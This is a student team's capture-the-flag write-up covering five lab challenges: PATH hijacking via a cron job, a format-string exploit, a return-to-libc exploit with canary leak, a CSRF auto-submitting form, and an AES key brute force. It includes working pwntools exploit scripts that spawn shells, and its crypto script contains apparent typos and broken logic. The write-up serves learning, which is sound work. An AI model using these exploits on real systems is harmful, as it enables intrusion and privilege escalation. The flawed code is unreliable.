# Extra CTFs

---

# British Punctuality

We started off this challenge by exploring the directories and files of the environment we had entered.

On the `home/flag_reader` we found some interesting information in the my_script.sh file where we could see the printenv command being used to call a relative path. This meant we could exploit it by re-writing the PATH environment variable.

![](https://i.imgur.com/qSIRP21.png)

After changing directories to `tmp` we found a last_log file with the following code:

![](https://i.imgur.com/oVnHK2D.png)

The server was performing the script every minute. Our user did not have access to the flag file but the cron job did, so this file would be the one registering the flag. 

With this in mind, we created ```aux.c``` with code to open flag.txt.

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    system(“cat /flags/flag.txt“); 
}
```

And compiled it using the name ```printenv``` so when printenv function is called it will run our code instead.

![](https://i.imgur.com/grHyLzn.png)

After this, we needed to update the PATH environment variable adding our directory in the first line so the printenv function call in our directory will be the one found and the one the system will run.

In order to do so, we created a file named env with the following code:

![](https://i.imgur.com/EHAN2Q7.png)

Ending up with the following files in our tmp directory:

![](https://i.imgur.com/PGFiL3X.png)

After this, we opened last_log and waited a few seconds to get our flag:

![](https://i.imgur.com/V58FVKg.png)

flag:
```
flag{a8e7aaf6295153aeb37d1ebe533e20b2}
```

# Final Format 

Firstly, we used checksec on our program:

![](https://i.imgur.com/hwLrD7R.png)

Realizing that writing in the stack would be a tough task.

Then, we tested if the string format vulnerability was there:

![](https://i.imgur.com/r91DV6a.png)

After this, we used gdb on our program and by using the ```info functionts``` command we were able to see all functions present in the code:

![](https://i.imgur.com/0YR6dT0.png)

One of the most important functions was ```old_backdoor``` because after analyzing this function with the ```disas``` command we found a system call that would open up a shell:

![](https://i.imgur.com/WwM6ZGG.png)

Because we needed to run that function, we wanted to redirect the flow of the program to that address. 

To do this, we used the gdb to find instructions where the code would jump to other addresses. We found a jump to the following address: `0x0804c010`.

After this, we built an exploit that would re-write the ```old_backdoor``` function to that address using format vulnerabilities:

```py
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(content)
p.interactive()
```

By running the above script, we were able to open a shell where we used the cat command to get the flag:

![](https://i.imgur.com/oxwFdcB.png)


flag:
```
flag{fc4dfb9fd63596334913d84e7094dd57}
```

## Echo

Firstly, we used checksec on our program:

![](https://i.imgur.com/V6X4wyS.png)

Finding every protection is up. 

In the description of the challenge we are given a hint that nothing is trully secure so we started exploring the program.

When running the program we tried to enforce the maximum number of chars it had, inputing 22 chars.

![](https://i.imgur.com/04wG4fL.png)

We can see that a stack smash occured. This probably happened because the program is not verifying the maximum number of chars and is hoping the canary will take care of this problem.

After this, we debugged the program, finding that a fgets function was reading 100 characters which is not normal as the maximum number of characters is, supposedly, 20. We suspected a format string vulnerability was occuring so we checked for it:

![](https://i.imgur.com/gZ6eqE6.png)

We were able to print the stack's information, confirming our suspicions.

Besides the `program` file, the challenge also gave us a `lib.c` file to explore. After a search we found information about an attack called `Return-to-libc`.

To perform the above attack we needed to do some things.

- Temporarily switch off the Address Space Layout Randomization (ASLR) to ensure it does not get in the way of this challenge using `echo 0 > /proc/sys/kernel/randomize_va_space`

- Find some specific values:

Firstly, the `"/bin/sh"` which we can get using `strings -t x libc.so.6 | grep "/bin/sh"` and the `system offset` which we can get using `readelf -s libc.so.6 | grep system`.

Secondly, the `base address of libc`. Because the program has PIE enabled, the address will be loaded in different places in each execution. In order to find the reference to libc we need this address, so we can calculate the offset between the libc base address even with randomization. 

Thirdly, the `offset of libc`. If we always know the offset, we can find its base address. 

![](https://i.imgur.com/T3ZYja1.png)

After this, we used `info proc map` with `gdb` and found the range where the libc is mapped which is from `0xf7d89000 to 0xf7f2b000`. 

To know which value was in that range and to use it to calculate the offset, a script that gets the values from the stack was built:

```
#!/usr/bin/python3
from pwn import *

LOCAL = False

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

for i in range(1,14):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline("%" + str(i) + "$10p")
	answer = p.recvline()
	print("i: ", i, "-> stack", answer)
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")


p.interactive()
```

Using this script, we found that the value between libc values was `0xf7daa519`, finding the offset using `0xf7daa519 - 0xf7d89000`.

After this, we used the same script to try and find the canary, which ususally ends with 00 because of \0:
![](https://i.imgur.com/kRlwgdJ.png)
![](https://i.imgur.com/LQEZtu6.png)

In index 8 the stack's value always ends with 00, so that is our canary.

Finally, we built a final script that reuses the above script running it 3 times:

- First to get the canary’s value and the libc reference address. This is done so that we can reset the canary, so it wont break, and calculate the libc address based on the offset from before. 
- Secondly, to overwrite the return’s address to the libc we calculated. 
- Finally, to insert the ‘\0’ so that the canary remains intact.

```
#!/usr/bin/python3
from pwn import *

LOCAL = False

referenceLibOffset = 0xf7daa519 - 0xf7d89000
systemLibOffset = 0x48150
shLibOffset = 0x1bd0f5

def sendMessage(p, message):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline(message)
	answer = p.recvline()
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")
	return answer

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

firstMessage = sendMessage(p, b"%8$x-%11$x")

canary, referenceVal = [int (val, 16) for val in firstMessage.split(b'-')]

libBase = referenceVal - referenceLibOffset
addressSystem = libBase + systemLibOffset
addressSH = libBase + shLibOffset

secondMessage = flat(b"A"*20, canary + 1, b"A"*8, addressSystem, b"A"*4, addressSH)

sendMessage(p, secondMessage)

sendMessage(p, b"A"*19)

p.interactive()
```
- We added 1 to the canary when writing secondMessage or else it will still end with 00 and we can't send bytes with 0.

- We calculated the addressSH and addressSystem based on the real libcbase.

- We rewrote the canary in the end, by adding “A” 19 times to reach the canary and set its end to 0. Bear in mind that A is 0x1010.

After running the script we were able to cat the flat.txt:

![](https://i.imgur.com/rkddE6l.png)

flag:
```
flag{122d40cb0dd355c631057cf597de3dac}
```

# Apply For Flag II

When we open the page we can see that all requests are associated with an id and that we have a button to submit a message. 
Unlike the week 10 challenge, after submitting the message, a page opens that tells us that the request is forwarded to another page ```page```.

![](https://i.imgur.com/l2ypnjG.png)

When we click on the ```page```, we are forwarded to another page where we find the <kbd>Give the flag</kbd> and <kbd>Mark request as read</kbd> buttons.

![](https://i.imgur.com/qFi8rAO.png)

To be able to submit directly to the last page, a post request needs to be created for the url "http://ctf-fsi.fe.up.pt:5005/request/" followed by the id shown on the home page, which is based on a new button that redirects to the page we want.

Finally, it is necessary to click on the <kbd>Give the flag</kbd> button, which again is disabled. Then we use getElementById again, to get the flag, using the id that we can find by inspecting the page. 

```
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/d13d848ffc51cdbcd7f5e4209f74ad2283d493c7/approve" role="form">          
    <div class="submit">                  
        <input type="submit" id="giveflag" value="Give the flag">   
    </div>  
</form>    

<script type="text/javascript"> 
    document.querySelector('#giveflag').click();  
</script>
```

After submitting the script, we come across a <strong> Forbidden </strong> error page, where we find the message "You don´t have the permission to access the requested resource. It is either read-protected or not readable by the server."

Since javaScript can break features like menus, sound, buttons, etc., we realized that we needed to disable javascript, in order to be able to load the page, without the error page.

![](https://i.imgur.com/4jvDxGZ.png)

After that, all we had to do was refresh the page.

![](https://i.imgur.com/RsxDPIE.png)


flag:
```
flag{5eb66c884c045b286a24ec2744f86885}
```

# NumberStation3

Initially we ran the provided code <kbd>nc ctf-fsi.fe.up.pt 6002 </kbd> in the shell and got an encrypted sequence of numbers and letters.

![](https://i.imgur.com/VDts3kV.png)

When analyzing the provided python code we had a function that generates a k, another that encodes and one that decodes.

In the first function provided, the one that generates the k, the number 16 is used ("<kbd>for i in range(16)</kbd>"), i.e. there are 2^16 possibilities to find the k that has the falg.

For this, we create a loop that runs 2^16 times and each time it generates a k, it decodes the respective message (with the dec function provided to us) until the message beginning with "flag" is found.

```
# Python Module ciphersuite
import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from binascii import hexlify, unhexlify

FLAG_FILE = '/flags/flag.txt'

# Use crypto random generation to get a key with length n
def gen(): 
	rkey = bytearray(os.urandom(16))
	for i in range(16): rkey[i] = rkey[i] & 1
	return bytes(rkey)

# Reverse operation
def dec(k, c):
	assert len(c) % 16 == 0
	cipher = Cipher(algorithms.AES(k), modes.ECB(), default_backend())
	decryptor = cipher.decryptor()
	blocks = len(c)//16
	msg = b""
	for i in range(0,(blocks)):
		msg+=decryptor.update(c[i*16:(i+1)*16])
		msg=msg[:-15]
	msg += decryptor.finalize()
	return msgp
    
c_shell= b"edb4324505e069ac7061b97d5ed13f4eca97f138d948b028e4fc13ef97ee82f3b2b4edb2052461c8cee27644fba0b3af9e5f37f0d265c0f1b5b92deb2ec4ef11cc13a01972b3c5772fbef47ce4555f7c9a78078c5418258438ef725e2fa01f63b2b4edb2052461c8cee27644fba0b3afc2d6de9b19bead3d60a82391bd305547844ec5b389e12022bcc9bd9a011bc8541142b00f210112c67f6b4715f7f9cc6f68af0f7ab3c597473f28dbc3c84fdf569a78078c5418258438ef725e2fa01f63dfb9c3d669d75b0b4f54a50d8077027b1142b00f210112c67f6b4715f7f9cc6fdff85c02a3b779cb129f8982d2cc715eb2b4edb2052461c8cee27644fba0b3af844ec5b389e12022bcc9bd9a011bc854844ec5b389e12022bcc9bd9a011bc8541142b00f210112c67f6b4715f7f9cc6f844ec5b389e12022bcc9bd9a011bc854ea527f7f2da944435216d3333619eafcbf6a84ab3609e2ef2c955feecd47244a844ec5b389e12022bcc9bd9a011bc854bf6a84ab3609e2ef2c955feecd47244a844ec5b389e12022bcc9bd9a011bc854dfb9c3d669d75b0b4f54a50d8077027b844ec5b389e12022bcc9bd9a011bc85468af0f7ab3c597473f28dbc3c84fdf56bf6a84ab3609e2ef2c955feecd47244aedb4324505e069ac7061b97d5ed13f4e1142b00f210112c67f6b4715f7f9cc6fea527f7f2da944435216d3333619eafcdfb9c3d669d75b0b4f54a50d8077027bdff85c02a3b779cb129f8982d2cc715eb275ff46093ac2a798ba6f66ca5faa459a78078c5418258438ef725e2fa01f6368af0f7ab3c597473f28dbc3c84fdf56f44f48db1831fc208468448658cbd14a0c4c08e4e5c4cc9e16171ade5373c884"

for i in range(2**16) :
	print (i)
	k2 = gen()
	if (dec(k2, unhexlify(c_shell)).decode('latin-1')[0:4] == "flag"):
		print(dec(k2,unhexlify(c_shell)).decode('latin-1'))
		break
```

After writing the script from above (in the python document provided) we ran the code and got the flag:

![](https://i.imgur.com/7UDRyJq.png)

```
flag{ca912dc823a11210515181d5f20834cd}
```






